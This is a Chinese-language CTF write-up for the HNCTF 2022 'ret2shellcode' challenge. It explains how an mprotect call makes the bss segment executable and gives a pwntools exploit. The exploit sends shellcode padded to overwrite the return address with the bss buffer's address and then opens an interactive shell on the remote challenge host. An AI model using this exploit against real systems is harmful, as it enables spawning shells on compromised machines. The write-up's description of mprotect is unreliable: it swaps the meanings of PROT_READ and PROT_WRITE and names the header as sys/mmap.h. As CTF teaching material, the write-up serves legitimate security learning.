[HNCTF 2022 Week1]ret2shellcode

一、前言

简单的shellcode，但是有需要注意的点

二、题目

检查保护机制

开启了NX不可执行保护，如果是ret2shellcode的类型，需要看一下bss段是否有执行权限。gdb中查看一下

可以看见此时还是可读可写，但是没有执行权限，到ida里面分析一下

向s段写入shellcode,strcpy会传到bss段的buff，相当于向bss段写入shellcode，我们只需要将函数返回地址修改为bss段buff的入口就行。

但是bss段没有可执行权限怎么办，这时候注意到函数中有一个mprotect函数。

mprotect函数

在Linux函数中，mprotect函数可以用来修改一段指定内存区域的访问权限

函数原型如下：

#include <unistd.h>
#include <sys/mmap.h>
int mprotect(const void *start, size_t len, int prot);

mprotect函数把自己statr开始的，长度为len的内存区的保护属性修改为prot指定的值

prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：

1）PROT_READ：表示内存段内的内容可写；

2）PROT_WRITE：表示内存段内的内容可读；

3）PROT_EXEC：表示内存段中的内容可执行；

4）PROT_NONE：表示内存段中的内容根本没法访问。

观察本题中的mprotect函数，目的就是为了把bss段改为可执行，所以可以用ret2shllcode

三、EXP

from pwn import*
context.os='Linux'
context.arch='amd64'
context.log_level='debug'

sh = remote('node1.anna.nssctf.cn',28373)
#sh = process('./pwn')
shellcode = asm(shellcraft.sh())

buff_bss = 0x4040A0

payload = shellcode.ljust(0x100,b'A')+p64(0)+p64(buff_bss)#ljust左对齐

sh.sendline(payload)

sh.interactive()

四、总结

知道mprotect能修改一段内存区域的访问权限
